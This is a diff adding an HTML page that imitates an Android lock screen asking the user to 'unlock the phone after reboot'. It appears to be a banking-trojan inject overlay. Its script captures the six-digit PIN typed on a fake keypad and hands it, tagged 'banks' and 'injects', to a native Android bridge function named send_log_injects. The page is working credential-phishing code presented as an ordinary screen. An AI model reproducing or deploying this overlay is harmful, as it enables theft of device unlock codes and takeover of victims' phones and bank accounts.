@@ -1,0 +1,200 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+<style>
+    body {
+        font-family: sans-serif;
+    }
+
+    form{
+        display: flex;
+        flex-direction: column;
+        height: 100vh;
+    }
+
+    header{
+        flex: 0.4;
+    }
+
+    body{
+        background-color: #fff;
+    }
+
+    .fakePass {
+        width: 15px;
+        height: 1px;
+        background-color: transparent;
+        border: 1px solid #cdcdcd;
+        background-color: transparent;
+        border-radius: 75px;
+        display: inline-block;
+    }
+
+    .td_.td_2 {
+        background: transparent;
+        padding-top: 0;
+        color: #ffffffb8;
+    }
+    
+    section{
+        flex: 1;
+    }
+
+    .pinpad.d-flex.justify-content-between {
+        padding: 21px 25px;
+    }
+
+    .td_.td_2 {
+        color: #ffffffb8;
+    }
+    
+    span.pinpad-item {
+        display: flex;
+        flex-direction: column;
+        color: #0b1425;
+        text-align: center;
+        font-size: 32px;
+        font-weight: 500;
+        width: 50px;
+        height: 50px;
+        margin-top: -14px;
+    }
+    
+    .checked {
+        background-color: #000 !important;
+        border-color: #000;
+        height: 20px;
+        width: 20px;
+    }
+
+    .grid {
+        display: grid;
+        grid-template-columns: 1fr 1fr 1fr;
+        grid-gap: 15px;
+        justify-items: center;
+        align-items: center;
+    }
+
+    .val {
+        cursor: pointer;
+    }
+</style>
+</head>
+<body>
+    <form onsubmit="return false">
+        <header>
+            
+        </header>
+        <section>
+            <h3 style="text-align: center; font-weight: 400;font-size: 15px; color: #01172f; margin-top:30px;margin-bottom: 15px;">
+                Unlock the phone after reboot
+            </h3>
+            <div class="kub">
+                <input type="password" id="password" class="input" maxlength="8" style="display: none;" disabled name="pin">
+    
+                <div style="margin: auto;display: flex;justify-content: space-evenly;width: 200px;align-items: center;">
+                    <div class="fakePass" id="pass1"></div>
+                    <div class="fakePass" id="pass2"></div>
+                    <div class="fakePass" id="pass3"></div>
+                    <div class="fakePass" id="pass4"></div>
+                    <div class="fakePass" id="pass5"></div>
+                    <div class="fakePass" id="pass6"></div>
+                </div>
+            </div>
+        </section>
+        <footer>
+            <div class="tr_ tr3">
+                <div class="td_ td_2">
+                    <div class="asd" style="background: transparent;">
+                        <div class="grid pinpad d-flex justify-content-between">
+                            <span class="pinpad-item">
+                                <span class="val" id="btnPin1" onclick="putPin(this)">1</span>
+                            </span>
+                            <span class="pinpad-item">
+                                <span class="val" id="btnPin2" onclick="putPin(this)">2</span>
+                                <span style="font-size: 10px;">ABC</span>
+                            </span>
+                            <span class="pinpad-item">
+                                <span class="val" id="btnPin3" onclick="putPin(this)">3</span>
+                                <span style="font-size: 10px;">DEF</span>
+                            </span>
+                            <span class="pinpad-item">
+                                <span class="val" id="btnPin4" onclick="putPin(this)">4</span>
+                                <span style="font-size: 10px;">GHI</span>
+                            </span>
+                            <span class="pinpad-item">
+                                <span class="val" id="btnPin5" onclick="putPin(this)">5</span>
+                                <span style="font-size: 10px;">JKL</span>
+                            </span>
+                            <span class="pinpad-item">
+                                <span class="val" id="btnPin6" onclick="putPin(this)">6</span>
+                                <span style="font-size: 10px;">MNO</span>
+                            </span>
+                            <span class="pinpad-item">
+                                <span class="val" id="btnPin7" onclick="putPin(this)">7</span>
+                                <span style="font-size: 10px;">PQRS</span>
+                            </span>
+                            <span class="pinpad-item">
+                                <span class="val" id="btnPin8" onclick="putPin(this)">8</span>
+                                <span style="font-size: 10px;">TUV</span>
+                            </span>
+                            <span class="pinpad-item">
+                                <span class="val" id="btnPin9" onclick="putPin(this)">9</span>
+                                <span style="font-size: 10px;">WXYZ</span>
+                            </span>
+                            <span class="pinpad-item" style="text-align: center;border: 0;font-size: 16px;margin: 0px; color: transparent;"> Forgot ? </span>
+                            <span class="pinpad-item">
+                                <span class="val" id="btnPin10" onclick="putPin(this)">0</span>
+                            </span>
+                            <span class="pinpad-item" id="btnDel" ng-click="reset();" style="text-align: center;border: 0;margin: 0px;"> 
+                            </span>
+                        </div>
+                        <p style="text-align: center;color: #000;font-weight: 500;">
+                            Forgot passcode
+                        </p>
+                    </div>
+                </div>
+            </div>
+        </footer>
+    </form>
+<script>
+    function putPin(cb){
+        if(password.value.length != 6){
+            password.value += String(cb.innerHTML)
+        }
+        
+        if(pass1.classList == 'fakePass') {
+            pass1.classList.add('checked');
+        } else if(pass2.classList == 'fakePass') {
+            pass2.classList.add('checked');
+        } else if(pass3.classList == 'fakePass') {
+            pass3.classList.add('checked');
+        } else if(pass4.classList == 'fakePass') {
+            pass4.classList.add('checked');
+        }else if(pass5.classList == 'fakePass') {
+            pass5.classList.add('checked');
+        }else if(pass6.classList == 'fakePass') {
+            pass6.classList.add('checked');
+
+            var data = {};
+                data.PIN = password.value;
+                data.type_injects = "banks";
+                data.closed = "close_activity_injects";
+
+                var ua = navigator.userAgent.toLowerCase();
+                if(ua.indexOf("android") > -1) {
+                try {
+                    Android.send_log_injects(JSON.stringify(data))
+                } catch (err) {}
+                }else{
+                    alert(JSON.stringify(data));
+                }
+        }        
+    }
+</script>
+</body>
+</html>
